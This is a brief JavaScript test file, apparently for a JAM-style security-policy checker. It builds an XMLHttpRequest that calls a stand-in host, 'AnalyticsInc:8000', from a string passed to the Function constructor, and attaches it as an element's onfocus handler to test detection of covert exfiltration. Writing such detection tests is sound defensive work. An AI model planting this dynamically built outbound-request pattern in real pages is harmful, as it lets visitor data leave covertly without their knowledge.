// exfil_test_onfocus3.js
var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=onfocus3", true);xmlhttp.send(null);';
var v0 = document.getElementById("test");
var v1 = JAM.call(Function, null, [exp]);
JAM.set(v0, "onfocus", v1)
